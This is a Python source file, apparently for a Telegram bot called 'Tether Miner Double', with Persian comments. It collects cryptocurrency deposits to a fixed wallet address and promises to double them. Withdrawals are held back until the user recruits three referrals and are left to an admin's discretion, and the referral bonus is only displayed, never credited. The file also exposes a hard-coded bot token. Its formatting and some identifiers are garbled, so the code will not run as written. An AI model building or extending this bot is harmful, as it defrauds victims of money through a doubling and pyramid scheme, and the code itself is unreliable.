import logging import sqlite3

from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup from telegram.ext import ( ApplicationBuilder, CallbackQueryHandler, CommandHandler, MessageHandler, ContextTypes, ConversationHandler, filters )

--- تنظیمات اولیه ---

TOKEN = "8047284110:AAGLIH-VVWRcTlwimcTQy0zimkiiBKY3vxo" ADMIN_ID = 6644712689

--- لاگ‌گیری ---

logging.basicConfig(level=logging.INFO) logger = logging.getLogger(name)

--- اتصال به دیتابیس ---

conn = sqlite3.connect("bot_data.db", check_same_thread=False) cursor = conn.cursor() cursor.execute(""" CREATE TABLE IF NOT EXISTS users ( user_id INTEGER PRIMARY KEY, username TEXT, full_name TEXT, balance REAL DEFAULT 0, referrals TEXT DEFAULT '' ) """) conn.commit()

--- مراحل مکالمه ---

(DEPOSIT_AMOUNT, DEPOSIT_PROOF, WITHDRAW_AMOUNT, WALLET_ADDRESS, SUPPORT_MESSAGE, ADMIN_REPLY) = range(6)

--- توابع رابط ---

def main_menu(): return InlineKeyboardMarkup([ [InlineKeyboardButton("Deposit", callback_data="deposit"), InlineKeyboardButton("Withdrawal", callback_data="withdraw"), InlineKeyboardButton("Balance", callback_data="balance")], [InlineKeyboardButton("Referral", callback_data="referral"), InlineKeyboardButton("Support", callback_data="support")] ])

def back_button(destination="menu"): return InlineKeyboardMarkup([[InlineKeyboardButton("بازگشت", callback_data=destination)]])

def get_referral_link(user_id): return f"https://t.me/TetherMinerDouble_Bot?start={user_id}"

--- دستورات اصلی ---

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE): user = update.effective_user cursor.execute("INSERT OR IGNORE INTO users (user_id, username, full_name) VALUES (?, ?, ?)", (user.id, user.username or "-", user.full_name)) conn.commit() await update.message.reply_text("Welcome to Tether Miner Double!", reply_markup=main_menu())

async def handle_referral(update: Update, context: ContextTypes.DEFAULT_TYPE): if context.args: referrer_id = int(context.args[0]) new_user = update.effective_user cursor.execute("SELECT * FROM users WHERE user_id = ?", (new_user.id,)) if cursor.fetchone() is None: cursor.execute("INSERT INTO users (user_id, username, full_name) VALUES (?, ?, ?)", (new_user.id, new_user.username or "-", new_user.full_name)) cursor.execute("SELECT referrals FROM users WHERE user_id = ?", (referrer_id,)) result = cursor.fetchone() if result: current = result[0] if str(new_user.id) not in current: updated = current + f",{new_user.id}" if current else str(new_user.id) cursor.execute("UPDATE users SET referrals = ? WHERE user_id = ?", (updated, referrer_id)) conn.commit() await context.bot.send_message(referrer_id, f"کاربر @{new_user.username or '-'} به عنوان زیرمجموعه شما اضافه شد.")

--- هندلر دکمه‌ها ---

async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE): query = update.callback_query await query.answer() user_id = query.from_user.id

if query.data == "menu":
    await query.message.edit_text("بازگشت به منوی اصلی:", reply_markup=main_menu())

elif query.data == "deposit":
    await query.message.edit_text("چه مقدار دلار می‌خواهید واریز کنید؟ (حداقل ۵ دلار)", reply_markup=back_button())
    return DEPOSIT_AMOUNT

elif query.data == "withdraw":
    cursor.execute("SELECT referrals FROM users WHERE user_id = ?", (user_id,))
    ref_list = cursor.fetchone()[0]
    if len(ref_list.split(",")) < 3:
        await query.message.edit_text(f"برای برداشت باید حداقل ۳ زیرمجموعه داشته باشید.\nلینک دعوت:\n{get_referral_link(user_id)}",
                                      reply_markup=back_button())
        return ConversationHandler.END
    await query.message.edit_text("چه مقدار می‌خواهید برداشت کنید؟", reply_markup=back_button())
    return WITHDRAW_AMOUNT

elif query.data == "balance":
    cursor.execute("SELECT balance FROM users WHERE user_id = ?", (user_id,))
    balance = cursor.fetchone()[0]
    await query.message.edit_text(f"موجودی شما: {balance} دلار", reply_markup=back_button())

elif query.data == "referral":
    cursor.execute("SELECT referrals, balance FROM users WHERE user_id = ?", (user_id,))
    referrals, balance = cursor.fetchone()
    ref_list = [x for x in referrals.split(",") if x.strip()]
    bonus = len(ref_list) * 1.5
    total = balance + bonus
    await query.message.edit_text(f"لینک دعوت: {get_referral_link(user_id)}\nزیرمجموعه‌ها: {len(ref_list)}\nپاداش کل: {bonus} دلار\nموجودی کل: {total} دلار",
                                  reply_markup=back_button())

elif query.data == "support":
    await query.message.edit_text("پیغام خود را ارسال کنید:", reply_markup=back_button())
    return SUPPORT_MESSAGE

elif query.data.startswith("confirm_deposit_"):
    parts = query.data.split("_")
    user_id, amount = int(parts[2]), float(parts[3])
    cursor.execute("UPDATE users SET balance = balance + ? WHERE user_id = ?", ((amount * 2), user_id))
    conn.commit()
    await context.bot.send_message(user_id, f"واریز تایید شد. موجودی شما دو برابر شد.")
    await query.message.delete()

elif query.data.startswith("reject_deposit_"):
    user_id = int(query.data.split("_")[2])
    await context.bot.send_message(user_id, "درخواست واریز شما رد شد.")
    await query.message.delete()

elif query.data.startswith("reply_support_"):
    context.user_data["reply_to"] = int(query.data.split("_")[2])
    await query.message.reply_text("متن پاسخ را وارد کنید:")
    return ADMIN_REPLY

--- مراحل واریز و برداشت و پشتیبانی ---

async def deposit_amount(update: Update, context: ContextTypes.DEFAULT_TYPE): try: amount = float(update.message.text) if amount < 5: await update.message.reply_text("حداقل واریز ۵ دلار است.", reply_markup=main_menu()) return ConversationHandler.END context.user_data["deposit_amount"] = amount await update.message.reply_text( "لطفاً مبلغ را به آدرس زیر واریز و مدرک را ارسال نمایید:\n\n" "0xcD3FcEf99251771a3dc1F6Aa992ff23f1824a1bB", parse_mode="Markdown", reply_markup=back_button("deposit") ) return DEPOSIT_PROOF except: await update.message.reply_text("لطفاً عدد معتبر وارد کنید.") return ConversationHandler.END

async def deposit_proof(update: Update, context: ContextTypes.DEFAULT_TYPE): user = update.effective_user amount = context.user_data.get("deposit_amount", 0) proof = update.message.text or (update.message.photo[-1].file_id if update.message.photo else "") keyboard = [[ InlineKeyboardButton("تایید", callback_data=f"confirm_deposit_{user.id}{amount}"), InlineKeyboardButton("رد", callback_data=f"reject_deposit{user.id}") ]] await context.bot.send_message(ADMIN_ID, f"درخواست واریز:\nکاربر: @{user.username or '-'} ({user.id})\nمقدار: {amount}\nمدرک:\n{proof}", reply_markup=InlineKeyboardMarkup(keyboard)) await update.message.reply_text("در حال بررسی توسط ادمین.") return ConversationHandler.END

async def withdraw_amount(update: Update, context: ContextTypes.DEFAULT_TYPE): try: amount = float(update.message.text) context.user_data["withdraw_amount"] = amount await update.message.reply_text("آدرس کیف پول (BEP20) را وارد کنید:", reply_markup=back_button("withdraw")) return WALLET_ADDRESS except: await update.message.reply_text("عدد نامعتبر است.") return ConversationHandler.END

async def wallet_address(update: Update, context: ContextTypes.DEFAULT_TYPE): user = update.effective_user amount = context.user_data["withdraw_amount"] address = update.message.text await context.bot.send_message(ADMIN_ID, f"درخواست برداشت از @{user.username or '-'} ({user.id})\nمقدار: {amount}\nآدرس: {address}") await update.message.reply_text("درخواست شما برای بررسی ارسال شد.") return ConversationHandler.END

async def support_message(update: Update, context: ContextTypes.DEFAULT_TYPE): user = update.effective_user msg = update.message.text keyboard = [[InlineKeyboardButton("پاسخ", callback_data=f"reply_support_{user.id}")]] await context.bot.send_message(ADMIN_ID, f"پیام از @{user.username or '-'} ({user.id}):\n{msg}", reply_markup=InlineKeyboardMarkup(keyboard)) await update.message.reply_text("پیام ارسال شد.") return ConversationHandler.END

async def admin_reply(update: Update, context: ContextTypes.DEFAULT_TYPE): user_id = context.user_data.get("reply_to") msg = update.message.text await context.bot.send_message(user_id, f"پاسخ ادمین:\n{msg}") await update.message.reply_text("پاسخ ارسال شد.") return ConversationHandler.END

--- راه‌اندازی بات ---

def main(): app = ApplicationBuilder().token(TOKEN).build()

conv = ConversationHandler(
    entry_points=[CallbackQueryHandler(button_handler)],
    states={
        DEPOSIT_AMOUNT: [MessageHandler(filters.TEXT & ~filters.COMMAND, deposit_amount)],
        DEPOSIT_PROOF: [MessageHandler(filters.ALL, deposit_proof)],
        WITHDRAW_AMOUNT: [MessageHandler(filters.TEXT & ~filters.COMMAND, withdraw_amount)],
        WALLET_ADDRESS: [MessageHandler(filters.TEXT & ~filters.COMMAND, wallet_address)],
        SUPPORT_MESSAGE: [MessageHandler(filters.TEXT & ~filters.COMMAND, support_message)],
        ADMIN_REPLY: [MessageHandler(filters.TEXT & ~filters.COMMAND, admin_reply)],
    },
    fallbacks=[]
)

app.add_handler(CommandHandler("start", start))
app.add_handler(CommandHandler("start", handle_referral))
app.add_handler(conv)
app.add_handler(CallbackQueryHandler(button_handler))

app.run_polling()

if name == 'main': main()

